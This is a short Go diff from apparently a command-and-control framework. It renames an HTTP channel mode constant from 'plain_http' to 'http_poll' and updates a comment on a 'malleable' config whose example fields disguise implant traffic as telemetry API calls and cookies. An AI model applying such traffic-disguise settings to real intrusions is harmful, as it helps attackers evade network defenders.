@@ -57,7 +57,7 @@ const (
 
 	// C2 channel modes select only the outer byte-stream wrapper.
 	// CBOR MsgAuth/MsgTunData stays authoritative for trust and routing.
-	C2ChannelModePlainHTTP = "plain_http"
+	C2ChannelModePlainHTTP = "http_poll"
 	C2ChannelModeH2Conn    = "h2conn"
 	C2ChannelModeDefault   = C2ChannelModePlainHTTP
 )
@@ -71,7 +71,7 @@ type C2Routing struct {
 	Proxy   string `cbor:"5,keyasint"`
 }
 
-// MalleableHTTPConfig defines how the plain_http transport disguises itself
+// MalleableHTTPConfig defines how the http_poll transport disguises itself
 type MalleableHTTPConfig struct {
 	C2Path        string            `cbor:"1,keyasint"` // e.g. "/api/v1/telemetry"
 	SessionHeader string            `cbor:"2,keyasint"` // e.g. "Cookie"
